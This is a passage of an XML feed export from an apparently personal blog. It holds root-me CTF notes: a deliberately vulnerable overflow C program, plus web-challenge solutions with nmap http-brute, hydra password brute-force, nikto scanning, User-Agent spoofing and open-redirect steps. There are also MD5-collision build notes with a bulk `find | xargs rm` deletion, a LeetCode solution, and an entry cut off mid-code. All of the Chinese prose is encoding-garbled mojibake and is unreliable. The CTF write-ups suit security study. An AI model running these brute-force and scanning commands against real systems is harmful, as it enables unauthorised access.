æ¼æ´ä¸»è¦æ˜¯åä¸¤ç§ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL çš„å†…å­˜æŒ‡é’ˆä¸º dangling pointerã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ELF x86 - BSS buffer overflow &amp;amp; æ„é€ shellcode&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; username[&lt;span class=&quot;number&quot;&gt;512&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*_atexit)(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;) =  &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;cp_username&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *name, &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *arg)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;((*(name++) = *(arg++)));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  *name = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; **argv)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(argc != &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;[-] Usage : %s &amp;lt;username&amp;gt;\n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  cp_username(username, argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;[+] Running program with username : %s\n&amp;quot;&lt;/span&gt;, username);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  _atexit(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>web-serverå‰å››é¢˜</title>
    <link href="http://finsenty54.github.io/2020/12/20/web-server-front-4/"/>
    <id>http://finsenty54.github.io/2020/12/20/web-server-front-4/</id>
    <published>2020-12-20T05:41:40.000Z</published>
    <updated>2020-12-20T05:43:03.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Weak-password"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</h1><h2 id="tNikto"><a href="#tNikto" class="headerlink" title="tNikto"></a>tNikto</h2><p>Niktoæ˜¯ä¸€æ¬¾å¼€æºçš„ï¼ˆGPLï¼‰ç½‘é¡µæœåŠ¡å™¨æ‰«æå™¨ï¼Œå®ƒå¯ä»¥å¯¹ç½‘é¡µæœåŠ¡å™¨è¿›è¡Œå…¨é¢çš„å¤šç§æ‰«æï¼ŒåŒ…å«è¶…è¿‡3300ç§æœ‰æ½œåœ¨å±é™©çš„æ–‡ä»¶ï¼CGIsï¼›è¶…è¿‡625ç§æœåŠ¡å™¨ç‰ˆæœ¬ï¼›è¶…è¿‡230ç§ç‰¹å®šæœåŠ¡å™¨é—®é¢˜ã€‚</p><p><code>nikto -host http://challenge01.root-me.org/web-serveur/ch3/</code></p><a id="more"></a><hr><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org</code></p><pre><code>-d: Increase debugging level-v: Increase verbosity level (use -vv or more for greater effect)--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories--script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</code></pre><hr><h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p><code>hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/ </code> </p><pre><code>- users list inspired by http://blog.infowebmaster.fr/public/resource/wordpress-brute-force-login-a-eviter.txt- passwords list downloaded from http://blog.teckn0.com/wp-content/uploads/brute_force/Liste_mot_%20anglais.7z</code></pre><h1 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h1><p><code>curl -L -A &quot;admin&quot; challenge01.root-me.org/web-serveur/ch2</code><br>     -A, â€“user-agent <name> Send User-Agent <name> to server<br>    -L, â€“location      Follow redirects</p><hr><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">resp = requests.get(<span class="string">&#x27;http://challenge01.root-me.org/web-serveur/ch2/&#x27;</span>, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Admin&#x27;</span>&#125;) </span><br><span class="line"><span class="built_in">print</span> resp.text</span><br></pre></td></tr></table></figure><h1 id="HTTP-open-redirt"><a href="#HTTP-open-redirt" class="headerlink" title="HTTP open redirt"></a>HTTP open redirt</h1><h2 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h2><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Select a domain to <span class="built_in">hash</span> <span class="keyword">not</span> listed <span class="keyword">in</span> the page, like: https://google.com</span><br><span class="line"><span class="number">2.</span> Hash the string domain here <span class="keyword">or</span> another: http://www.fileformat.info/tool/<span class="built_in">hash</span>.htm</span><br><span class="line">3. Construct the url like this and press enter: http://challenge01.root-me.org/web-serveur/ch52/?url=##DOMAIN##&amp;h=##HASH##</span><br><span class="line"><span class="number">4.</span> When new page <span class="keyword">is</span> loading, you can see the flag, stop the redirection pressing escape <span class="keyword">and</span> copy it.</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Weak-password&quot;&gt;&lt;a href=&quot;#Weak-password&quot; class=&quot;headerlink&quot; title=&quot;Weak password&quot;&gt;&lt;/a&gt;Weak password&lt;/h1&gt;&lt;h2 id=&quot;tNikto&quot;&gt;&lt;a href=&quot;#tNikto&quot; class=&quot;headerlink&quot; title=&quot;tNikto&quot;&gt;&lt;/a&gt;tNikto&lt;/h2&gt;&lt;p&gt;Niktoæ˜¯ä¸€æ¬¾å¼€æºçš„ï¼ˆGPLï¼‰ç½‘é¡µæœåŠ¡å™¨æ‰«æå™¨ï¼Œå®ƒå¯ä»¥å¯¹ç½‘é¡µæœåŠ¡å™¨è¿›è¡Œå…¨é¢çš„å¤šç§æ‰«æï¼ŒåŒ…å«è¶…è¿‡3300ç§æœ‰æ½œåœ¨å±é™©çš„æ–‡ä»¶ï¼CGIsï¼›è¶…è¿‡625ç§æœåŠ¡å™¨ç‰ˆæœ¬ï¼›è¶…è¿‡230ç§ç‰¹å®šæœåŠ¡å™¨é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nikto -host http://challenge01.root-me.org/web-serveur/ch3/&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="web-server in root me" scheme="http://finsenty54.github.io/categories/web-server-in-root-me/"/>
    
    
    <category term="web" scheme="http://finsenty54.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>md5å¿«é€Ÿç¢°æ’</title>
    <link href="http://finsenty54.github.io/2020/12/17/md5%E5%BF%AB%E9%80%9F%E7%A2%B0%E6%92%9E/"/>
    <id>http://finsenty54.github.io/2020/12/17/md5%E5%BF%AB%E9%80%9F%E7%A2%B0%E6%92%9E/</id>
    <published>2020-12-17T11:31:08.000Z</published>
    <updated>2020-12-17T11:45:13.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="md5å¿«é€Ÿç¢°æ’"><a href="#md5å¿«é€Ÿç¢°æ’" class="headerlink" title="md5å¿«é€Ÿç¢°æ’"></a>md5å¿«é€Ÿç¢°æ’</h1><p><a href="https://github.com/Finsenty54/fast_collision">https://github.com/Finsenty54/fast_collision</a></p><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><h3 id="å¤´æ–‡ä»¶"><a href="#å¤´æ–‡ä»¶" class="headerlink" title="å¤´æ–‡ä»¶"></a>å¤´æ–‡ä»¶</h3><p><a href="https://www.runoob.com/w3cnote/cpp-header.html">https://www.runoob.com/w3cnote/cpp-header.html</a><br>C++ è¯­è¨€æ”¯æŒâ€åˆ†åˆ«ç¼–è¯‘â€ï¼ˆseparatecompilationï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªç¨‹åºæ‰€æœ‰çš„å†…å®¹ï¼Œå¯ä»¥åˆ†æˆä¸åŒçš„éƒ¨åˆ†åˆ†åˆ«æ”¾åœ¨ä¸åŒçš„ .cpp æ–‡ä»¶é‡Œã€‚.cpp æ–‡ä»¶é‡Œçš„ä¸œè¥¿éƒ½æ˜¯ç›¸å¯¹ç‹¬ç«‹çš„ï¼Œåœ¨ç¼–è¯‘ï¼ˆcompileï¼‰æ—¶ä¸éœ€è¦ä¸å…¶ä»–æ–‡ä»¶äº’é€šï¼Œåªéœ€è¦åœ¨ç¼–è¯‘æˆ<code>ç›®æ ‡æ–‡ä»¶</code>åå†ä¸å…¶ä»–çš„ç›®æ ‡æ–‡ä»¶åšä¸€æ¬¡<code>é“¾æ¥</code>ï¼ˆlinkï¼‰å°±è¡Œäº†ã€‚</p><a id="more"></a><h3 id="æ¡ä»¶ç¼–è¯‘"><a href="#æ¡ä»¶ç¼–è¯‘" class="headerlink" title="æ¡ä»¶ç¼–è¯‘"></a>æ¡ä»¶ç¼–è¯‘</h3><h3 id="boostå®‰è£…"><a href="#boostå®‰è£…" class="headerlink" title="boostå®‰è£…"></a>boostå®‰è£…</h3><p><code>./b2 install </code>å</p><p>æ‰§è¡Œ<code>sudo ldconfig</code><br>è¿è¡Œç¨‹åºåå°±èƒ½åŠ è½½å…±äº«åº“</p><p><em>ç¨‹åºè¿è¡Œç»“æœ</em></p><pre><code>â”Œâ”€[zentreisender@parrotos]â”€[~/Documents/essay!!!!!!!!!!/hash_collision/fast_collision]â””â”€â”€â•¼ $./first_try Generating first block: ........ 6.637388s wall, 6.620000s user + 0.000000s system = 6.620000s CPU (99.7%)</code></pre><hr><h3 id="æŸ¥æ‰¾åç¼€æ–‡ä»¶"><a href="#æŸ¥æ‰¾åç¼€æ–‡ä»¶" class="headerlink" title="æŸ¥æ‰¾åç¼€æ–‡ä»¶"></a>æŸ¥æ‰¾åç¼€æ–‡ä»¶</h3><pre><code>find -name &quot;*.txt&quot; | xargs rmxargs --helpUsage: xargs [OPTION]... COMMAND [INITIAL-ARGS]...</code></pre><hr><pre><code>find ./ -regextype posix-extended -regex &quot;.*\.(txt|bin)&quot; </code></pre><h3 id="vscodiumè°ƒè¯•"><a href="#vscodiumè°ƒè¯•" class="headerlink" title="vscodiumè°ƒè¯•"></a>vscodiumè°ƒè¯•</h3><p>æ³¨æ„åœ¨è°ƒè¯•æ—¶éœ€è¦åœ¨<code>makefile</code>æ–‡ä»¶ä¸­é…ç½®å¥½debugï¼ˆæ–¹æ³•å‚è€ƒ2.ä½¿ç”¨å‘½ä»¤è¡Œè°ƒè¯•å¤§å‹ç¨‹åºéƒ¨åˆ†ï¼‰ï¼Œå¦åˆ™æ— æ³•æ ‡è®°æ–­ç‚¹ã€‚</p><p><code>åœ¨ç”Ÿæˆå¯¹è±¡æ–‡ä»¶æ—¶åŠ  -g</code></p><h3 id="parrot-oså®‰è£…ä¸­æ–‡è¾“å…¥æ³•"><a href="#parrot-oså®‰è£…ä¸­æ–‡è¾“å…¥æ³•" class="headerlink" title="parrot oså®‰è£…ä¸­æ–‡è¾“å…¥æ³•"></a>parrot oså®‰è£…ä¸­æ–‡è¾“å…¥æ³•</h3><p><a href="https://parrotsec-cn.org/t/ibus-rime/3950">https://parrotsec-cn.org/t/ibus-rime/3950</a><br>ibus-rime</p><h3 id="å‡½æ•°å¸¸æ•°æ˜¯æ•°ç»„"><a href="#å‡½æ•°å¸¸æ•°æ˜¯æ•°ç»„" class="headerlink" title="å‡½æ•°å¸¸æ•°æ˜¯æ•°ç»„"></a>å‡½æ•°å¸¸æ•°æ˜¯æ•°ç»„</h3><p>C++ ä¼ æ•°ç»„ç»™ä¸€ä¸ªå‡½æ•°ï¼Œæ•°ç»„ç±»å‹è‡ªåŠ¨è½¬æ¢ä¸ºæŒ‡é’ˆç±»å‹ï¼Œå› è€Œä¼ çš„å®é™…æ˜¯åœ°å€ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;md5å¿«é€Ÿç¢°æ’&quot;&gt;&lt;a href=&quot;#md5å¿«é€Ÿç¢°æ’&quot; class=&quot;headerlink&quot; title=&quot;md5å¿«é€Ÿç¢°æ’&quot;&gt;&lt;/a&gt;md5å¿«é€Ÿç¢°æ’&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Finsenty54/fast_collision&quot;&gt;https://github.com/Finsenty54/fast_collision&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;C&quot;&gt;&lt;a href=&quot;#C&quot; class=&quot;headerlink&quot; title=&quot;C++&quot;&gt;&lt;/a&gt;C++&lt;/h2&gt;&lt;h3 id=&quot;å¤´æ–‡ä»¶&quot;&gt;&lt;a href=&quot;#å¤´æ–‡ä»¶&quot; class=&quot;headerlink&quot; title=&quot;å¤´æ–‡ä»¶&quot;&gt;&lt;/a&gt;å¤´æ–‡ä»¶&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.runoob.com/w3cnote/cpp-header.html&quot;&gt;https://www.runoob.com/w3cnote/cpp-header.html&lt;/a&gt;&lt;br&gt;C++ è¯­è¨€æ”¯æŒâ€åˆ†åˆ«ç¼–è¯‘â€ï¼ˆseparatecompilationï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªç¨‹åºæ‰€æœ‰çš„å†…å®¹ï¼Œå¯ä»¥åˆ†æˆä¸åŒçš„éƒ¨åˆ†åˆ†åˆ«æ”¾åœ¨ä¸åŒçš„ .cpp æ–‡ä»¶é‡Œã€‚.cpp æ–‡ä»¶é‡Œçš„ä¸œè¥¿éƒ½æ˜¯ç›¸å¯¹ç‹¬ç«‹çš„ï¼Œåœ¨ç¼–è¯‘ï¼ˆcompileï¼‰æ—¶ä¸éœ€è¦ä¸å…¶ä»–æ–‡ä»¶äº’é€šï¼Œåªéœ€è¦åœ¨ç¼–è¯‘æˆ&lt;code&gt;ç›®æ ‡æ–‡ä»¶&lt;/code&gt;åå†ä¸å…¶ä»–çš„ç›®æ ‡æ–‡ä»¶åšä¸€æ¬¡&lt;code&gt;é“¾æ¥&lt;/code&gt;ï¼ˆlinkï¼‰å°±è¡Œäº†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="HASH" scheme="http://finsenty54.github.io/categories/HASH/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>leetcode longest_substring_without_repeating_characters</title>
    <link href="http://finsenty54.github.io/2020/12/11/LEETCODE-longest_substring_without_repeating_characters/"/>
    <id>http://finsenty54.github.io/2020/12/11/LEETCODE-longest_substring_without_repeating_characters/</id>
    <published>2020-12-11T08:49:29.000Z</published>
    <updated>2020-12-11T08:51:36.726Z</updated>
    
    <content type="html"><![CDATA[<h2 id="longest-substring-without-repeating-characters"><a href="#longest-substring-without-repeating-characters" class="headerlink" title="longest_substring_without_repeating_characters"></a>longest_substring_without_repeating_characters</h2><p>è¿™é¢˜ç”¨åˆ°äº†å“ˆå¸Œè¡¨ å’Œ æ»‘åŠ¨çª—å£</p><p>æ»‘åŠ¨çª—å£ï¼š<br>å°±æ˜¯æœ‰ä¸¤ä¸ªå˜é‡åˆ†åˆ«æŒ‡ç¤º çª—å£çš„ å¤´å’Œå°¾ï¼Œå°±å¯ä»¥ä»»æ„æ”¹å˜è¿™ä¸¤ä¸ªå˜é‡</p><p>å“ˆå¸Œè¡¨ï¼š<br>å“ˆå¸Œè¡¨å­˜ç€ç›®å‰æœ€é•¿å­ç»„çš„å€¼-åœ°å€å¯¹</p><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Solution::lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> begin=<span class="number">0</span>,end=<span class="number">0</span>,begin_new=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; windows;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s.size(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//windows.insert(make_pair(s[i],i));</span></span><br><span class="line">        <span class="keyword">if</span>(windows.count(s[end])==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            windows.insert(<span class="built_in">make_pair</span>(s[end],end));</span><br><span class="line">            end++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//æœ‰é‡å¤å€¼ï¼Œé‚£ä¹ˆè·å¾—ç›®å‰çš„æœ€å¤§å€¼</span></span><br><span class="line">            <span class="keyword">if</span> (end-begin&gt;count || count==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                count=end-begin;</span><br><span class="line">            &#125;</span><br><span class="line">            begin_new=windows[s[end]]+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//delete </span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">size_t</span> i = begin; i &lt; begin_new; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                windows.erase(s[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//æ’å…¥æ–°çš„é‡å¤å€¼</span></span><br><span class="line">            windows.insert(<span class="built_in">make_pair</span>(s[end],end));</span><br><span class="line">            end++;</span><br><span class="line">            begin=begin_new;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (end-begin&gt;count)</span><br><span class="line">    &#123;</span><br><span class="line">        count=end-begin;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> count;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/rAyOUO"><img src="https://s3.ax1x.com/2020/12/11/rAyOUO.jpg" alt="rAyOUO.jpg"></a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;longest-substring-without-repeating-characters&quot;&gt;&lt;a href=&quot;#longest-substring-without-repeating-characters&quot; class=&quot;headerlink&quot; title=&quot;longest_substring_without_repeating_characters&quot;&gt;&lt;/a&gt;longest_substring_without_repeating_characters&lt;/h2&gt;&lt;p&gt;è¿™é¢˜ç”¨åˆ°äº†å“ˆå¸Œè¡¨ å’Œ æ»‘åŠ¨çª—å£&lt;/p&gt;
&lt;p&gt;æ»‘åŠ¨çª—å£ï¼š&lt;br&gt;å°±æ˜¯æœ‰ä¸¤ä¸ªå˜é‡åˆ†åˆ«æŒ‡ç¤º çª—å£çš„ å¤´å’Œå°¾ï¼Œå°±å¯ä»¥ä»»æ„æ”¹å˜è¿™ä¸¤ä¸ªå˜é‡&lt;/p&gt;
&lt;p&gt;å“ˆå¸Œè¡¨ï¼š&lt;br&gt;å“ˆå¸Œè¡¨å­˜ç€ç›®å‰æœ€é•¿å­ç»„çš„å€¼-åœ°å€å¯¹&lt;/p&gt;</summary>
    
    
    
    <category term="leetcode" scheme="http://finsenty54.github.io/categories/leetcode/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Stack buffer overflow basic 3</title>
    <link href="http://finsenty54.github.io/2020/12/11/Stack_buffer_overflow_basic_3/"/>
    <id>http://finsenty54.github.io/2020/12/11/Stack_buffer_overflow_basic_3/</id>
    <published>2020-12-11T07:21:28.000Z</published>
    <updated>2020-12-11T07:23:47.261Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-Stack-buffer-overflow-basic-3"><a href="#ELF-x86-Stack-buffer-overflow-basic-3" class="headerlink" title="ELF x86 - Stack buffer overflow basic 3"></a>ELF x86 - Stack buffer overflow basic 3</h2><a id="more"></a><p>å‚è€ƒ:: <a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%203">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%203</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 